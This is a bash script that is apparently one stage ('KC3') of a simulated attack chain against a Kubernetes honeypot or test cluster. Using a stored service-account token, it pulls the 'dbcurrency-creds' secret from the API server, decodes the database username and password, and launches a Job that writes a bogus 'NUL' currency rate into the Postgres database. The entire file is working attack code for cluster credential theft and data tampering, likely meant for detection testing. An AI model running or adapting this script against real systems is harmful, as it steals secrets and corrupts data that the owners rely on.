#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

# ===== Config =====
API_SERVER="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
NS="${NSPROTO:-app}"

SECRET="dbcurrency-creds"
JOB_NAME="insert-currency-rate-$(date +%Y%m%d%H%M%S)"
PGHOST="postgres.$NSDATA.svc.cluster.local"
PGPORT="5432"
PGDATABASE="currency"
SQL_STMT="INSERT INTO currency (code, rate) VALUES ('NUL', 0) ON CONFLICT (code) DO UPDATE SET rate = EXCLUDED.rate;"
TOKEN="$(cat $DATA_PATH/KC3/tokenCurrency)"
USER_FILE="$DATA_PATH/KC3/dbcurrency-user"
PASS_FILE="$DATA_PATH/KC3/dbcurrency-pass"

# Installing dependencies and setup
require_tools curl jq base64
mkdir -p "$DATA_PATH/KC3"

if [[ -s "$USER_FILE" && -s "$PASS_FILE" ]]; then
  USER="$(cat "$USER_FILE")"
  PASS="$(cat "$PASS_FILE")"
else
  echo "[KC3-308] credential artifacts missing, reading ${NS}/${SECRET} as compatibility fallback"
  SECRET_JSON=$(curl -sk \
    --header "Authorization: Bearer $TOKEN" \
    $API_SERVER/api/v1/namespaces/$NS/secrets/$SECRET)
  USER="$(jq -r '.data.username' <<<"$SECRET_JSON" | base64 -d)"
  PASS="$(jq -r '.data.password' <<<"$SECRET_JSON" | base64 -d)"
fi

echo "[KC3-308] using recovered database credentials for user ${USER}"

JOB_JSON="$(
  jq -n \
    --arg name "$JOB_NAME" \
    --arg ns "$NS" \
    --arg pghost "$PGHOST" \
    --arg pgport "$PGPORT" \
    --arg pgdb "$PGDATABASE" \
    --arg pguser "$USER" \
    --arg pgpass "$PASS" \
    --arg sql "$SQL_STMT" '
{
  apiVersion: "batch/v1",
  kind: "Job",
  metadata: {
    name: $name,
    namespace: $ns,
    labels: {
      "app.kubernetes.io/name": "insert-currency-rate",
      "honeypot.attack.kc": "KC3"
    }
  },
  spec: {
    backoffLimit: 0,
    ttlSecondsAfterFinished: 300,
    template: {
      spec: {
        restartPolicy: "Never",
        containers: [
          {
            name: "psql",
            image: "postgres:16-alpine",
            env: [
              { name: "PGHOST", value: $pghost },
              { name: "PGPORT", value: $pgport },
              { name: "PGDATABASE", value: $pgdb },
              { name: "PGUSER", value: $pguser },
              { name: "PGPASSWORD", value: $pgpass },
              { name: "SQL", value: $sql }
            ],
            command: [
              "sh","-c",
              "psql \"host=$PGHOST port=$PGPORT dbname=$PGDATABASE user=$PGUSER password=$PGPASSWORD sslmode=disable\" -v ON_ERROR_STOP=1 -c \"$SQL\""
            ]
          }
        ]
      }
    }
  }
}
'
)"

MANIFEST_FILE="$DATA_PATH/KC3/$JOB_NAME.json"
printf '%s\n' "$JOB_JSON" > "$MANIFEST_FILE"
echo "[KC3-308] job manifest saved in ${MANIFEST_FILE}"

echo "[KC3-308] creating Job ${NS}/${JOB_NAME}"
CREATE_RESP="$(
  curl -sSk -X POST \
    --header "Authorization: Bearer ${TOKEN}" \
    -H "Content-Type: application/json" \
    -d @"${MANIFEST_FILE}" \
    "${API_SERVER}/apis/batch/v1/namespaces/${NS}/jobs"
)"

if echo "$CREATE_RESP" | jq -e '.kind=="Job"' >/dev/null 2>&1; then
  echo "[KC3-308] job created"
else
  echo "[KC3-308] error creating the Job. API answer:"
  echo "$CREATE_RESP" | jq .
  exit 1
fi

echo "[KC3-308] waiting for Job ${JOB_NAME} to complete"
deadline=$((SECONDS + ${JOB_WAIT_TIMEOUT_SECONDS:-180}))
while (( SECONDS < deadline )); do
  JOB_JSON="$(curl -sSk \
    --header "Authorization: Bearer ${TOKEN}" \
    "${API_SERVER}/apis/batch/v1/namespaces/${NS}/jobs/${JOB_NAME}")"
  if echo "$JOB_JSON" | jq -e '.status.conditions[]? | select(.type=="Complete" and .status=="True")' >/dev/null 2>&1; then
    printf '%s\n' "$JOB_NAME" > "$DATA_PATH/KC3/currency-rate-inserted"
    echo "[KC3-308] job completed; NUL currency rate inserted"
    exit 0
  fi
  if echo "$JOB_JSON" | jq -e '.status.conditions[]? | select(.type=="Failed" and .status=="True")' >/dev/null 2>&1; then
    echo "Job failed: ${JOB_NAME}" >&2
    echo "$JOB_JSON" | jq . >&2
    exit 1
  fi
  sleep 3
done

echo "Timed out waiting for Job ${JOB_NAME} completion" >&2
exit 1
